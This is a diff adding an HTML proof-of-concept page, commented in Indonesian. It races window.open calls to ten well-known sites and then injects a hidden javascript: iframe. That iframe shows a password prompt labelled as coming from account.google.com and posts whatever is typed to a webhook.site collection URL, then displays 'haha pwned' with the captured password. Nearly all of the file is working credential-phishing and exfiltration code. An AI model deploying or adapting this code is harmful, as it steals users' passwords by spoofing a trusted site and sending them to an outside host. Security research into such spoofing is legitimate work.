@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 50px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 20px;
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Click to trigger</h2>
+    <button id="triggerBtn">PoC</button>
+    <div id="status"></div>
+    <form id="hiddenForm" class="hidden" method="POST" action="https://webhook.site/a0e0c5fe-06e8-45e3-a9c0-de820eb2432d/submit">
+        <input type="text" id="passwordInput" name="password">
+    </form>
+
+    <script>
+        // === NEW: daftar domain yang dibuka dalam race (10 target) ===
+        const TARGETS = [
+            "https://www.google.com/csi",
+            "https://www.wikipedia.org/",
+            "https://www.youtube.com/robots.txt",
+            "https://www.apple.com/contact/",
+            "https://www.microsoft.com/",
+            "https://www.amazon.com/robots.txt",
+            "https://www.instagram.com/",
+            "https://www.yahoo.com/",
+            "https://www.reddit.com/robots.txt",
+            "https://developer.mozilla.org/"
+        ];
+
+        const statusEl = document.getElementById('status');
+
+        document.getElementById('triggerBtn').onclick = () => {
+            const handles = [];
+
+            // === Tetap: buka domain legit pertama (seperti PoC asli) ===
+            const w = window.open(TARGETS[0]);
+            if (!w) {
+                statusEl.innerHTML = 'Popup blocked. Fallback not implemented.';
+                return;
+            }
+            handles.push(w);
+
+            // === NEW: burst window.open() untuk sisanya (race) ===
+            for (let i = 1; i < TARGETS.length; i++) {
+                const delay = i * 55 + Math.floor(Math.random() * 35); // jitter kecil
+                setTimeout(() => {
+                    try {
+                        const h = window.open(TARGETS[i], "_blank");
+                        if (h) handles.push(h);
+                    } catch (e) { /* ignore */ }
+                }, delay);
+            }
+
+            statusEl.textContent = "Launching 10-window race…";
+
+            // === Tetap: setelah ~2s, suntik iframe javascript: yang memicu prompt ===
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:(function(){var p=prompt("account.google.com says                                                                                                                                     Password:");if(p){document.write(\'<form method="POST" action="https://webhook.site/a0e0c5fe-06e8-45e3-a9c0-de820eb2432d/submit" id="iframeForm"><input type="hidden" name="password" value="\'+p+\'"><input type="submit"></form>\');document.getElementById("iframeForm").submit();}})()';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // Tetap: listener form tersembunyi (tidak digunakan langsung, dibiarkan sesuai PoC asli)
+                const hiddenForm = document.getElementById('hiddenForm');
+                hiddenForm.onsubmit = (e) => {
+                    e.preventDefault();
+                    const password = document.getElementById('passwordInput').value;
+                    if (password) {
+                        statusEl.innerHTML = 'haha pwned<br>Password captured: ' + password;
+                    } else {
+                        statusEl.innerHTML = 'haha pwned<br>No password captured.';
+                    }
+                    // === NEW: cleanup semua tab yang dibuka ===
+                    setTimeout(() => {
+                        try { document.body.removeChild(iframe); } catch(_) {}
+                        handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_){} });
+                    }, 2000);
+                };
+
+                // Tetap: polling iframe untuk deteksi submit & ambil nilai (jika memungkinkan)
+                const checkIframe = setInterval(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const iframeForm = iframeDoc.getElementById('iframeForm');
+                        if (iframeForm) {
+                            const pwd = iframeForm.querySelector('input[name="password"]').value;
+                            if (pwd) {
+                                statusEl.innerHTML = 'haha pwned<br>Password captured: ' + pwd;
+                                clearInterval(checkIframe);
+                                setTimeout(() => {
+                                    try { document.body.removeChild(iframe); } catch(_) {}
+                                    handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_){} });
+                                }, 2000);
+                            }
+                        }
+                    } catch (e) {
+                        // Cross-origin error; cleanup tetap jalan
+                        clearInterval(checkIframe);
+                    }
+                }, 500);
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
